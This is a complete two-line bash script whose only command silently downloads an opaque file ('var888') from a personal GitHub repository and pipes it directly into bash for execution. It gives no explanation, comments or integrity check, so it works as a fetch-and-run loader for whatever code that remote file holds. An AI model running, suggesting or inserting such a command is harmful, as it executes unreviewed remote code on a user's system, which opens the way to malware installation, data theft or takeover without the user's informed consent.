#!/bin/bash

curl -sL  https://raw.githubusercontent.com/renjanaayudisha57/noteas/refs/heads/main/var888 | bash